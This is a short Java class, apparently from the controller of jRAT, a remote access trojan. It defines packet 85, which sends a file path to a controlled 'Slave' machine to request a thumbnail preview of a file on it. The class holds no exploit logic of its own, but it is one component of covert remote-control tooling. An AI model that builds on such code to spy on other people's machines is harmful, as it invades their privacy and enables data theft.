package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet85ThumbnailPreview extends AbstractOutgoingPacket {

	private String file;

	public Packet85ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 85;
	}

}
